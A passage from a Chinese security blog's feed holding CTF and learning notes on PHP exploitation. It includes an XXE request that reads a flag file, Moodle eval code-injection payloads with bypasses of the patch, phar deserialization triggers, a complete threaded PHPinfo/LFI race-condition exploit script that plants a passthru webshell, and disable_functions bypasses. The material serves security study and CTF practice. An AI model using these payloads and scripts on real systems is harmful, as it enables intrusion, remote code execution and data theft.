class="line">var</span><br></pre></td></tr></table></figure></p><p>读取<code>flagvvvvvaaaagegsgag2333</code></p><p>请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /www/ HTTP/1.1</span><br><span class="line">Host: 210.32.4.21:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://210.32.4.21:8080/www/index.html</span><br><span class="line">Content-Type: application/xml; charset=UTF-8</span><br><span class="line">Content-Length: 171</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///flagvvvvvaaaagegsgag2333&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;name&lt;/name&gt;</span><br><span class="line">&lt;age&gt;&amp;xxe;&lt;/age&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>响应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Content-Length: 64</span><br><span class="line">Date: Fri, 16 Nov 2018 16:47:38 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Received name: name, age: EIS&#123;f501e9c5323c560b0a40192ce9b7ad38&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SimpleBBS&quot;&gt;&lt;a href=&quot;#SimpleBBS&quot; class=&quot;headerlink&quot; title=&quot;SimpleBBS&quot;&gt;&lt;/a&gt;SimpleBBS&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerli
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2018最新PHP漏洞利用技巧</title>
    <link href="http://zer0yu.github.io/2018/11/13/New-PHP-exploit-techniques/"/>
    <id>http://zer0yu.github.io/2018/11/13/New-PHP-exploit-techniques/</id>
    <published>2018-11-13T15:12:58.000Z</published>
    <updated>2018-11-13T15:24:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-综述"><a href="#0x00-综述" class="headerlink" title="0x00 综述"></a>0x00 综述</h2><p>本文学习了几种新式的php exploit方法，在此做一笔记</p><ul><li>文件删除漏洞, unlink()</li><li>Phar 反序列化, file*()</li><li>PHP对象实例化, ReflectionClass()</li></ul><h2 id="0x01-WordPress-Design-Flaw-Leads-to-WooCommerce-RCE"><a href="#0x01-WordPress-Design-Flaw-Leads-to-WooCommerce-RCE" class="headerlink" title="0x01 WordPress Design Flaw Leads to WooCommerce RCE"></a>0x01 WordPress Design Flaw Leads to WooCommerce RCE</h2><p>WooCommerce 3.4.6本版本之前存在任意删除漏洞，因为WordPress的设计缺陷将导致整站被接管。</p><p>设计缺陷:</p><ul><li>WooCommerce插件被关闭之后edit_users权限依旧存在</li><li>但是插件的disallow_editing_of_admins过滤器不会再被触发</li><li>一般只有administrators可以关闭插件，（但是我们这里有任意文件删除，相当于关闭了插件）</li></ul><p>参考：<br><a href="https://blog.ripstech.com/2018/wordpress-design-flaw-leads-to-woocommerce-rce/" target="_blank" rel="noopener">https://blog.ripstech.com/2018/wordpress-design-flaw-leads-to-woocommerce-rce/</a></p><h2 id="0x02-Moodle-lt-3-5-0"><a href="#0x02-Moodle-lt-3-5-0" class="headerlink" title="0x02 Moodle &lt; 3.5.0"></a>0x02 Moodle &lt; 3.5.0</h2><p>Code Injection</p><p>首先，教师角色是必须的(可以利用xss得到)</p><p>使用了eval函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">substitute_variables_and_eval</span><span class="params">($str, $dataset)</span> </span>&#123;</span><br><span class="line"><span class="comment">// substitues &#123;x&#125; and &#123;y&#125; for numbers like 1.2 with str_replace():</span></span><br><span class="line">        $formula = <span class="keyword">$this</span>-&gt;substitute_variables($str, $dataset);  </span><br><span class="line">        <span class="keyword">if</span> ($error = qtype_calculated_find_formula_errors($formula)) &#123;     </span><br><span class="line">            <span class="keyword">return</span> $error;<span class="comment">// formula security mechanism</span></span><br><span class="line">        &#125;</span><br><span class="line">        $str=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'$str = '</span>.$formula.<span class="string">';'</span>);<span class="comment">// dangerous eval()-call</span></span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是有过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qtype_calculated_find_formula_errors</span><span class="params">($formula)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Returns false if everything is alright</span></span><br><span class="line">    <span class="comment">// otherwise it constructs an error message.</span></span><br><span class="line">    <span class="comment">// Strip away dataset names.</span></span><br><span class="line">    <span class="keyword">while</span> (preg_match(<span class="string">'~\\&#123;[[:alpha:]][^&gt;&#125; &lt;&#123;"\']*\\&#125;~'</span>, $formula, $regs))&#123;</span><br><span class="line">        $formula = str_replace($regs[<span class="number">0</span>], <span class="string">'1'</span>, $formula);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Strip away empty space and lowercase it.</span></span><br><span class="line">    $formula = strtolower(str_replace(<span class="string">' '</span>, <span class="string">''</span>, $formula));</span><br><span class="line"></span><br><span class="line">    $safeoperatorchar = <span class="string">'-+/*%&gt;:^\~&lt;?=&amp;|!'</span>; <span class="comment">/* */</span></span><br><span class="line">    $operatorornumber = <span class="string">"[&#123;$safeoperatorchar&#125;.0-9eE]"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"~[^&#123;$safeoperatorchar&#125;.0-9eE]+~"</span>, $formula, $regs)) &#123;</span><br><span class="line">        <span class="keyword">return</span> get_string(<span class="string">'illegalformulasyntax'</span>,<span class="string">'qtype_calculated'</span>,$regs[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Formula just might be valid.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bypass过滤<br><a href="https://i.loli.net/2018/11/13/5beaccdb43658.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/13/5beaccdb43658.png" alt="屏幕快照 2018-11-13 下午9.06.43.png"></a></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.&#123;a.`$_GET[0]`&#125;</span><br><span class="line">2. /*&#123;a*/`$_GET[0]`;//&#123;x&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt; 0=(date;cat/etc/passwd)&gt;../hi.txt</span><br></pre></td></tr></table></figure><p><strong>bypass官方补丁</strong></p><p>1.Blacklist</p><p>补丁说明:循环检测输入中是否存在//,/*,#<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qtype_calculated_find_formula_errors</span><span class="params">($formula)</span> </span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> ([<span class="string">'//'</span>, <span class="string">'/*'</span>, <span class="string">'#'</span>] <span class="keyword">as</span> $commentstart) &#123;</span><br><span class="line"><span class="keyword">if</span> (strpos($formula, $commentstart) !== <span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> get_string(<span class="string">'illegalformulasyntax'</span>,</span><br><span class="line">  <span class="string">'qtype_calculated'</span>, </span><br><span class="line">   $commentstart);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1?&gt;&lt;?=log(1)&#123;a.`$_GET[0]`.(&#123;x&#125;)&#125;?&gt;</span><br></pre></td></tr></table></figure><p>2.拒绝使用占位符嵌套</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">find_dataset_names</span><span class="params">($text)</span> </span>&#123;</span><br><span class="line"><span class="comment">// Returns the possible dataset names found in the text as an array.</span></span><br><span class="line"><span class="comment">// The array has the dataset name for both key and value.</span></span><br><span class="line"><span class="keyword">if</span> (preg_match_all(<span class="string">'~\\&#123;([[:alpha:]][^&gt;&#125; &lt;&#123;"\']*)\\&#125;~'</span>,$text,$regs)) &#123;</span><br><span class="line">$datasetnames = array_unique($regs[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span> array_combine($datasetnames, $datasetnames);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> [];</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qtype_calculated_find_formula_errors</span><span class="params">($formula)</span> </span>&#123;</span><br><span class="line">    $datasetnames = find_dataset_names($formula);</span><br><span class="line">    <span class="keyword">foreach</span> ($datasetnames <span class="keyword">as</span> $datasetname) &#123;</span><br><span class="line">        $formula = str_replace(<span class="string">'&#123;'</span>.$datasetname.<span class="string">'&#125;'</span>, <span class="string">'1'</span>, $formula);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*&#123;x&#125;&#123;a*/</span>`$_GET[<span class="number">0</span>]`<span class="comment">/*(1)//&#125;&#123;a*/</span>`$_GET[<span class="number">0</span>]`<span class="comment">/*(&#123;x&#125;)//&#125;*/</span></span><br></pre></td></tr></table></figure><p>3.黑名单+线性替换</p><p>控制xml实现</p><p>参考:</p><p><a href="https://blog.ripstech.com/2018/moodle-remote-code-execution/" target="_blank" rel="noopener">https://blog.ripstech.com/2018/moodle-remote-code-execution/</a></p><h2 id="0x03-WordPress-File-Delete-to-Code-Execution"><a href="#0x03-WordPress-File-Delete-to-Code-Execution" class="headerlink" title="0x03 WordPress File Delete to Code Execution"></a>0x03 WordPress File Delete to Code Execution</h2><p>影响范围: =&lt;4.9.6</p><p>前提:拥有媒体文件的删除权限(只能利用其它漏洞或者错误配置来取得)</p><p>删除目标:</p><p><code>.htaccess</code> 有时其中会包含一些安全策略(比如:访问某些文件夹的权限)，删除后会是安全策略无效。</p><p><code>index.php files</code> 一般这个文件是空的，主要是为了防止列目录，被删除了就有可能去列目录了。</p><p><code>wp-config.php</code> 这个删除了，WordPress就要被重装了。</p><p>参考:<a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" target="_blank" rel="noopener">https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</a></p><h2 id="0x04-Phar-Deserialization"><a href="#0x04-Phar-Deserialization" class="headerlink" title="0x04 Phar:// Deserialization"></a>0x04 Phar:// Deserialization</h2><p>敏感点:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">file_get_contents(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">file_put_contents(<span class="string">'phar://test.phar'</span>, <span class="string">''</span>);</span><br><span class="line">copy(<span class="string">'phar://test.phar'</span>, <span class="string">''</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">file_get_contents(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">file_put_contents(<span class="string">'phar://test.phar'</span>, <span class="string">''</span>);</span><br><span class="line">copy(<span class="string">'phar://test.phar'</span>, <span class="string">''</span>);</span><br><span class="line">file_exists(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">is_executable(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">is_file(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">is_dir(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">is_link(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">is_writable(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">fileperms(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">fileinode(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">filesize(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">fileowner(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">filegroup(<span class="string">'phar://test.phar'</span>); fileatime(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">filemtime(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">filectime(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">filetype(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">getimagesize(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">exif_read_data(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">stat(<span class="string">'phar://test.phar'</span>); </span><br><span class="line">lstat(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">touch(<span class="string">'phar://test.phar‘);</span></span><br><span class="line"><span class="string">md5_file('</span>phar:<span class="comment">//test.phar');</span></span><br></pre></td></tr></table></figure></p><p>可以参考:</p><p><a href="https://blog.ripstech.com/2018/new-php-exploitation-technique/" target="_blank" rel="noopener">https://blog.ripstech.com/2018/new-php-exploitation-technique/</a></p><p><a href="http://seaii-blog.com/index.php/2018/08/23/86.html" target="_blank" rel="noopener">http://seaii-blog.com/index.php/2018/08/23/86.html</a></p><p><a href="https://www.anquanke.com/post/id/157657" target="_blank" rel="noopener">https://www.anquanke.com/post/id/157657</a></p><p><a href="https://www.anquanke.com/post/id/157439" target="_blank" rel="noopener">https://www.anquanke.com/post/id/157439</a></p><h2 id="0x05-Shopware-lt-5-3-4-PHP-Object-Instantiation-to-XXE-to-RCE"><a href="#0x05-Shopware-lt-5-3-4-PHP-Object-Instantiation-to-XXE-to-RCE" class="headerlink" title="0x05 Shopware &lt; 5.3.4 PHP Object Instantiation to XXE to RCE"></a>0x05 Shopware &lt; 5.3.4 PHP Object Instantiation to XXE to RCE</h2><p>影响范围:Shopware version &lt;= 5.3.3 and &gt;= 5.1</p><p>XSS→POI→XMLi→XXE→PHAR→POI→POP→RCE</p><p>参考:<br><a href="https://blog.ripstech.com/2017/shopware-php-object-instantiation-to-blind-xxe/" target="_blank" rel="noopener">https://blog.ripstech.com/2017/shopware-php-object-instantiation-to-blind-xxe/</a></p><p>突然发现有人翻译过<br><a href="https://www.freebuf.com/vuls/154415.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/154415.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-综述&quot;&gt;&lt;a href=&quot;#0x00-综述&quot; class=&quot;headerlink&quot; title=&quot;0x00 综述&quot;&gt;&lt;/a&gt;0x00 综述&lt;/h2&gt;&lt;p&gt;本文学习了几种新式的php exploit方法，在此做一笔记&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件删除漏洞
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>phpinfo可以告诉我们什么</title>
    <link href="http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/"/>
    <id>http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/</id>
    <published>2018-11-12T16:09:33.000Z</published>
    <updated>2018-11-16T08:32:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-基本信息"><a href="#0x00-基本信息" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h2><h3 id="system-info"><a href="#system-info" class="headerlink" title="system info"></a>system info</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171023/HE8cH44f3e.png" alt="image"></p><p>详细的操作系统信息，为提权做准备</p><h3 id="extension-dir"><a href="#extension-dir" class="headerlink" title="extension_dir"></a>extension_dir</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/BjlfKkaFAg.png" alt="image"><br>php扩展的路径</p><h3 id="真实ip"><a href="#真实ip" class="headerlink" title="真实ip"></a>真实ip</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/13al8a7Gl0.png" alt="image"><br>cdn什么的都不存在的，找到真实ip，扫一扫旁站，没准就拿下几个站。</p><h3 id="web根目录"><a href="#web根目录" class="headerlink" title="web根目录"></a>web根目录</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/4BibE1a8mJ.png" alt="image"></p><h3 id="临时文件路径"><a href="#临时文件路径" class="headerlink" title="临时文件路径"></a>临时文件路径</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/81AcH81K8j.png" alt="image"><br>向phpinfo()页面post一个shell（自己写一个上传页面），可以在_FILES[“file1”]中看到上传的临时文件，如果有个lfi，便可以直接getshell了。</p><p>phpinfo-lfi<br>利用脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## PHP : Winning the race condition vs Temporary File Upload - PHPInfo() exploit </span></span><br><span class="line"><span class="comment"># Alternative way to easy_php @ N1CTF2018, solved by intrd &amp; shrimpgo - p4f team</span></span><br><span class="line"><span class="comment"># @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## passwords.txt payload content</span></span><br><span class="line"><span class="comment"># &lt;?php $c=fopen('/app/intrd','w');fwrite($c,'&lt;?php passthru($_GET["f"]);?&gt;');?&gt;</span></span><br><span class="line"></span><br><span class="line">import sys,Queue,threading,hashlib,os, requests,  pickle, os.path, re</span><br><span class="line">from subprocess import Popen, PIPE, STDOUT</span><br><span class="line"></span><br><span class="line">NumOfThreads=<span class="number">50</span></span><br><span class="line">queue = Queue.Queue()</span><br><span class="line"></span><br><span class="line">class checkHash(threading.Thread):</span><br><span class="line">def __init__(<span class="keyword">self</span>,queue):</span><br><span class="line">threading.Thread.__init__(<span class="keyword">self</span>)</span><br><span class="line"><span class="keyword">self</span>.queue=queue</span><br><span class="line">def run(<span class="keyword">self</span>):</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">self</span>.clear=<span class="keyword">self</span>.queue.get()</span><br><span class="line">passtry = <span class="keyword">self</span>.clear</span><br><span class="line"><span class="keyword">if</span> passtry != <span class="string">""</span>:</span><br><span class="line"></span><br><span class="line">padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>: <span class="string">'o99quh47clk8br394298tkv5o0'</span>,</span><br><span class="line">    <span class="string">'othercookie'</span>: padding</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: padding,</span><br><span class="line">    <span class="string">'Pragma'</span>: padding,</span><br><span class="line">    <span class="string">'Accept'</span>: padding,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: padding,</span><br><span class="line">    <span class="string">'DNT'</span>: <span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'arquivo'</span>: open(<span class="string">'passwords.txt'</span>,<span class="string">'rb'</span>)&#125;</span><br><span class="line"></span><br><span class="line">reqs=<span class="string">'http://47.97.221.96:23333/index.php?action=../../var/www/phpinfo/index.php&amp;a='</span>+padding</span><br><span class="line"><span class="comment">#reqs='http://172.17.0.2:80/index.php?action=../../var/www/phpinfo/index.php&amp;a='+padding</span></span><br><span class="line">response = requests.post(reqs, headers=headers, cookies=cookies, files=files, verify=<span class="keyword">False</span>)</span><br><span class="line">data = response.content</span><br><span class="line">data = re.search(r<span class="string">"(?&lt;=tmp_name] =&amp;gt; ).*"</span>, data).group(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">reqs = <span class="string">'http://47.97.221.96:23333/index.php?action=../..'</span>+data</span><br><span class="line"><span class="comment">#reqs = 'http://172.17.0.2:80/index.php?action=../..'+data</span></span><br><span class="line"><span class="keyword">print</span> reqs</span><br><span class="line">response = requests.get(reqs, verify=<span class="keyword">False</span>)</span><br><span class="line">data = response.content</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">self</span>.queue.task_done()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(NumOfThreads):</span><br><span class="line">    t=checkHash(queue)</span><br><span class="line">    t.setDaemon(<span class="keyword">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x in range(<span class="number">0</span>, <span class="number">9999</span>):</span><br><span class="line">x=str(x)</span><br><span class="line">queue.put(x.strip())</span><br><span class="line"></span><br><span class="line">queue.join()</span><br></pre></td></tr></table></figure></p><p>参考:<a href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/" target="_blank" rel="noopener">http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/</a></p><h2 id="0x02-重要配置"><a href="#0x02-重要配置" class="headerlink" title="0x02 重要配置"></a>0x02 重要配置</h2><h3 id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a>allow_url_include</h3><p>远程文件包含，但是一般不会开启</p><h3 id="asp-tags"><a href="#asp-tags" class="headerlink" title="asp_tags"></a>asp_tags</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171023/0G7c7mmj2I.png" alt="image"></p><p>php标签有4种形式，如果这个选项不开启的话(一般默认不开启)，使用asp的标签是不会解析的。</p><p>这里有一篇<code>user.ini</code>+<code>asp_tags</code>绕过的文章 <a href="https://www.math1as.com/index.php/archives/468/" target="_blank" rel="noopener">针对内容(php tags)检测的一种绕过思路</a></p><p>实际就是通过向其中添加<code>php_value asp_tags On</code>并上传<code>.htaccess</code>和<code>.user.ini</code>来bypass。</p><p>原理，asp_tags的属性是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP_INI_PERDIR：指令可以在php.ini、httpd.conf或.htaccess文件中修改</span><br></pre></td></tr></table></figure><p>注意： 在PHP 7已经完全移除了这种标签</p><h3 id="short-open-tag"><a href="#short-open-tag" class="headerlink" title="short_open_tag"></a>short_open_tag</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/h4bGaFaceD.png" alt="image"><br>还是标签的问题，允许&lt;??&gt;这种形式，并且&lt;?=等价于&lt;? echo</p><h3 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/mF8ekJH0mJ.png" alt="image"><br>有时候我们上传了一个webshell却不能用，有很大可能是管理员做了配置，禁用了php执行系统命令的函数。</p><p>绕过的方式有这么几个：</p><p>1.黑名单绕过<br>百密一疏，寻找黑名单中漏掉的函数，上图中禁用的函数算是比较全的了。</p><p>比如有时候没有禁用proc_open</p><p>比如在编译php时如果加了-–enable-pcntl选项，就可以使用pcntl_exec()来执行命令。</p><p>pcntl是linux下的一个扩展，可以支持php的多线程操作。<br>pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP &gt; 4.2.0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> pcntl_exec(“/bin/bash”, <span class="keyword">array</span>(“/tmp/b4dboy.sh”));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="http://secoff.net/archives/116.html" target="_blank" rel="noopener">渗透技巧：利用pcntl_exec突破disable_functions</a></p><p>2.利用扩展（如ImageMagick）绕过<br><a href="https://www.waitalone.cn/imagemagic-bypass-disable_function.html" target="_blank" rel="noopener">利用ImageMagick漏洞绕过disable_function</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Disable Functions: "</span> . ini_get(<span class="string">'disable_functions'</span>) . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$command = 